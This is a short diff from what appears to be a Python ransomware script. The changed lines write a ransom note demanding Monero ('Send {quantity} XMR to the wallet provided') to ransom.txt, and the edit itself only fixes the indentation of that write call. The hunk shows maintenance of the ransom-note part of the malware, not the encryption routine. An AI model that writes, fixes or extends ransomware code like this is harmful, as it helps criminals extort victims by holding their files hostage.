@@ -108,7 +108,7 @@ Send {quantity} XMR to the wallet provided.
 '''
 print(message)
 with open("ransom.txt", "w") as theransom:
-theransom.write(message)
+    theransom.write(message)
 
 """
 
